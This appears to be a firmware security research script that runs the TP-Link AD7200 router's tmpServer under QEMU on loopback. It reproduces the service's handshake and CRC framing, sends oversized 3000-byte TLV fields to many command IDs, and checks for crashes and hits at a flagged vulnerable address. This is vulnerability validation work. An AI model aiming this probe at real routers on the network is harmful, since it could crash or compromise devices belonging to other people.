#!/usr/bin/env python3
"""Protocol-valid, loopback-only validation of the AD7200 tmpServer binary."""
from __future__ import annotations

import json
import os
import signal
import socket
import struct
import subprocess
import time
import zlib
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
ROOTFS = ROOT / "known_firmware/extracted/60f753419137504b/_AD7200_EU_US__V2.0_210430.zip.extracted/AD7200(EU_US)_V2.0_210430/_AD7200v2-up-ver2-0-2-P1[20210430-rel61094]_2021-05-06_11.48.13.bin.extracted/squashfs-root"
QEMU = Path(os.environ.get("AD7200_QEMU", "/usr/local/bin/qemu-arm-static"))
OUTPUT = ROOT / "known_firmware/reports/TP-Link_AD7200/TMPSERVER_DYNAMIC_VALIDATION_2026-07-20.json"


def frame(kind: int, payload: bytes = b"", sequence: int = 1, flag: int = 0) -> bytes:
    # The implementation substitutes the native bytes 5a 6b 7c 8d while computing CRC-32.
    header = struct.pack("!BBBBHBBI", 1, 0, kind, 0, len(payload), flag, 0, sequence) + bytes.fromhex("5a6b7c8d")
    checksum = zlib.crc32(header + payload) & 0xFFFFFFFF
    return header[:12] + struct.pack("!I", checksum) + payload


def receive(sock: socket.socket) -> bytes:
    data = b""
    while len(data) < 16:
        part = sock.recv(16 - len(data))
        if not part:
            return data
        data += part
    length = struct.unpack("!H", data[4:6])[0]
    while len(data) < 16 + length:
        part = sock.recv(16 + length - len(data))
        if not part:
            break
        data += part
    return data


def connect() -> tuple[socket.socket, list[str]]:
    sock = socket.create_connection(("127.0.0.1", 20002), timeout=2)
    transcript = []
    # Association packets use the four-byte short header; data packets use 16 bytes.
    sock.sendall(bytes((1, 0, 1, 0)))
    response = sock.recv(4)
    transcript.append(response.hex())
    if len(response) != 4 or response[2] != 2:
        raise RuntimeError(f"association request rejected: {response.hex()}")
    sock.sendall(bytes((1, 0, 2, 0)))
    return sock, transcript


def wait_for_port(proc: subprocess.Popen[bytes]) -> None:
    deadline = time.monotonic() + 8
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            raise RuntimeError(f"tmpServer exited early with {proc.returncode}")
        try:
            test = socket.create_connection(("127.0.0.1", 20002), timeout=0.1)
            test.close()
            return
        except OSError:
            time.sleep(0.05)
    raise RuntimeError("tmpServer did not listen on TCP/20002")


def main() -> int:
    Path("/var/run").mkdir(parents=True, exist_ok=True)
    try:
        Path("/var/run/ubus.sock").unlink()
    except FileNotFoundError:
        pass
    target_log_path = Path("/tmp/ad7200-tmpserver-target.log")
    ubusd_log_path = Path("/tmp/ad7200-tmpserver-ubusd.log")
    target_log = target_log_path.open("wb")
    ubusd_log = ubusd_log_path.open("wb")
    ubusd = subprocess.Popen([str(QEMU), "-L", str(ROOTFS), str(ROOTFS / "sbin/ubusd")], stdout=ubusd_log, stderr=subprocess.STDOUT)
    time.sleep(0.3)
    target_args = [str(QEMU), "-L", str(ROOTFS)]
    trace_path = Path("/tmp/ad7200-tmpserver-qemu.trace")
    if os.environ.get("AD7200_TMP_TRACE") == "1":
        target_args += ["-d", "exec,nochain", "-D", str(trace_path)]
    target_args.append(str(ROOTFS / "usr/bin/tmpServer"))
    target = subprocess.Popen(target_args, stdout=target_log, stderr=subprocess.STDOUT)
    result: dict[str, object] = {"target_sha256": "82258267fa9e9a0d2926ef68d373ad6534b615480ca5331c5fb79bd7b6e02e68", "tests": []}
    try:
        wait_for_port(target)
        commands = [0x0100, 0x0101, 0x0102, 0x0200, 0x0300, 0x0302, 0x0303, 0x0304,
                    0x0400, 0x0401, 0x0402, 0x0403, 0x0440, 0x0441, 0x0442, 0x0443,
                    0x0500, 0x0501, 0x0502, 0x0503, 0x0550, 0x0551, 0x0600, 0x0601,
                    0x0660, 0x0695, 0x0696, 0x0697]
        if os.environ.get("AD7200_TMP_COMMANDS"):
            commands = [int(value, 0) for value in os.environ["AD7200_TMP_COMMANDS"].split(",")]
        for command in commands:
            test: dict[str, object] = {"command": f"0x{command:04x}"}
            try:
                sock, transcript = connect()
                value = bytes((index & 0xff for index in range(3000)))
                tlv = struct.pack("!HH", 0x0034, len(value)) + value
                payload = bytes((1, 1)) + struct.pack("!H", command) + tlv
                sock.sendall(frame(5, payload, sequence=3))
                response = receive(sock)
                transcript.append(response.hex())
                test.update(response_type=response[2] if len(response) >= 3 else None,
                            response_error=response[7] if len(response) >= 8 else None,
                            transcript=transcript)
                sock.close()
            except Exception as exc:
                test["error"] = repr(exc)
            result["tests"].append(test)
            if target.poll() is not None:
                break
        result["target_alive"] = target.poll() is None
        result["target_returncode"] = target.poll()
    finally:
        for proc in (target, ubusd):
            if proc.poll() is None:
                proc.send_signal(signal.SIGTERM)
        for proc in (target, ubusd):
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()
        target_log.close()
        ubusd_log.close()
        result["target_output"] = target_log_path.read_text(encoding="utf-8", errors="replace")
        result["ubusd_output"] = ubusd_log_path.read_text(encoding="utf-8", errors="replace")
        if trace_path.exists():
            hits = 0
            with trace_path.open("r", encoding="utf-8", errors="replace") as trace:
                for line in trace:
                    hits += line.count("00014c84")
            result["vulnerable_pc_trace_hits"] = hits
            trace_path.unlink()
        OUTPUT.parent.mkdir(parents=True, exist_ok=True)
        OUTPUT.write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
    print(OUTPUT)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
